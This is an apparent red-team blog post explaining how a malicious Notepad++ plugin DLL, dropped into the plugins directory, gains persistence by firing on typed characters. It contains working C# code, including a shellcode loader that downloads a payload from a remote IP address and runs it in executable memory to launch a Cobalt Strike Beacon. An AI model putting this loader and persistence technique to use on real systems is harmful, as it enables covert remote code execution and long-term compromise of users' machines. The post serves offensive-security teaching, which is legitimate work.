---
title: "Notepad++ Plugins for Persistence"
date: 2022-01-29T15:54:31Z
draft: false
authors:
    - RastaMouse
---

[Notepad++](https://notepad-plus-plus.org/downloads/) is a popular Windows text editor, which has an extension capability in the way of [plugins](https://npp-user-manual.org/docs/plugins/).  The **Plugin Manager** allows users to download and install [approved](https://github.com/notepad-plus-plus/nppPluginList) plugins, but you can also install your own plugins locally.  A plugin can be built in a variety of languages including [C++](https://github.com/npp-plugins/plugintemplate/releases) and [C#](https://github.com/kbilsted/NotepadPlusPlusPluginPack.Net).

To install a custom plugin, the DLL can simply be dropped inside `%PROGRAMFILES%\Notepad++\plugins\pluginName\pluginName.dll`.  The up-side is that no user interaction is required to load or activate the plugin.  The down-side is that local admin rights are required to write to the directory.

Here, I'm using the .NET template to run some code from the `OnNotification` method.  This is fired every time Notepad++ does "something".  The notification code can be used by the plugin to determine whether or not it needs to do anything.

```c#
static bool firstRun = true;

public static void OnNotification(ScNotification notification)
{
    if (notification.Header.Code == (uint)SciMsg.SCI_ADDTEXT && firstRun)
    {
        using var process = Process.GetCurrentProcess();
        MessageBox.Show($"Hello from {process.ProcessName} ({process.Id}).");

        firstRun = !firstRun;
    }
}
```

In this example, the `SCI_ADDTEXT` notification is used.  This is fires everytime the user types a character, but there are literally hundreds of notification types that you could use instead.  I like this approach, since it doesn't require the user to interact with a plugin menu item or anything like that.  I also add a boolean flag to ensure the "malicious" code is only run once.

Once compiled, create a new directory inside `plugins` and copy the DLL there.

```text
PS C:\> ls 'C:\Program Files\Notepad++\plugins\TotallyLegitPlugin\'

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        30/01/2022     10:22         164352 TotallyLegitPlugin.dll
```

Now launch Notepad++ and type a character.

![](/images/notepad_plusplus/msgbox.png "MessageBox")

Replace the MessageBox with a shellcode loader or anything else you fancy.  This is the most basic example:

```c#
if (notification.Header.Code == (uint)SciMsg.SCI_ADDTEXT && firstRun)
{
    using var client = new WebClient();
    var buf = client.DownloadData("http://172.19.215.47/shellcode");

    var hMemory = VirtualAlloc(
        IntPtr.Zero,
        (uint)buf.Length,
        AllocationType.Reserve | AllocationType.Commit,
        MemoryProtection.ReadWrite);

    Marshal.Copy(buf, 0, hMemory, buf.Length);

    _ = VirtualProtect(
            hMemory,
            (uint)buf.Length,
            MemoryProtection.ExecuteRead,
            out _);

    _ = CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            0,
            out _);

    firstRun = !firstRun;
}
```

![](/images/notepad_plusplus/beacon.png "Cobale Strike Beacon")

If Notepad++ is launched in high integrity (e.g. to modify a privileged system file such as `C:\Windows\System32\drivers\etc\hosts`), the Beacon will also run in high integrity.
